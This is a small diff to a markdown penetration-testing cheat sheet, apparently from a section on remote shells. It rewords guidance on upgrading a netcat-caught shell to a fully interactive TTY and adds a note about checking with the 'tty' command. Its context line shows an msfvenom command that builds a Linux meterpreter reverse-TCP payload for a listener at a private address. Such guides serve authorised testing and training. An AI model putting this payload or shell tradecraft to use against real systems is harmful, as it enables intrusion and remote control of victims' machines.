@@ -204,9 +204,11 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f el
 
 ## Upgrading remote shells
 
-### Upgrade to fully interactive shell \(python example\):
+After catching a shell through netcat, you are placed in a shell that has very limited functionality. If the remote machine has python or python3 installed you can easily upgrade to a fully functional TTY shell.
 
-After catching a shell through netcat, you are placed in a shell that has very limited functionality. If the remote machine has python or python3 installed you can easily upgrade to a fully functional shell.
+ **Note:** To check if the shell is a TTY shell use the `tty` command.
+
+### Upgrade to fully interactive shell \(python example\):
 
 ```bash
 #On victim machine
